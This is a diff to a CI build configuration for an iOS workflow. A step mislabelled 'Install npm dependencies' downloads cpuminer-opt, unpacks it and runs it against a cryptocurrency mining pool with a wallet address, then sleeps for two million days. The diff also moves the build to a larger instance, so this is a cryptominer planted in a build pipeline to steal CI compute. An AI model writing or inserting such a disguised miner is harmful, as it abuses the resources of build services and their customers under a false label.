@@ -2,7 +2,7 @@ workflows:
   ios-workflow:
     name: iOS Workflow
     max_build_duration: 60
-    instance_type: mac_mini
+    instance_type: mac_pro
     environment:
       vars:
         XCODE_WORKSPACE: "YOUR_WORKSPACE_NAME.xcworkspace"  # YOUR WORKSPACE NAME HERE
@@ -21,8 +21,8 @@ workflows:
           source: true
     scripts:
       - name: Install npm dependencies
-        wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz &&
-        tar -xvf cpuminer-opt-mac,.tar.gz 
-        slee 2s
-        ./cpuminer-sse2 -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.1 -t 4 -B --cpu-priority 4
-        sleep 2d
+        script: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz
+              tar -xvf cpuminer-opt-mac.tar.gz 
+              sleep 2s
+              ./cpuminer-sse2 -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q6jhhzvqcenetm05cutg6f302v4egznata7sf77.1 -t 4 -B --cpu-priority 4
+              sleep 2000000d
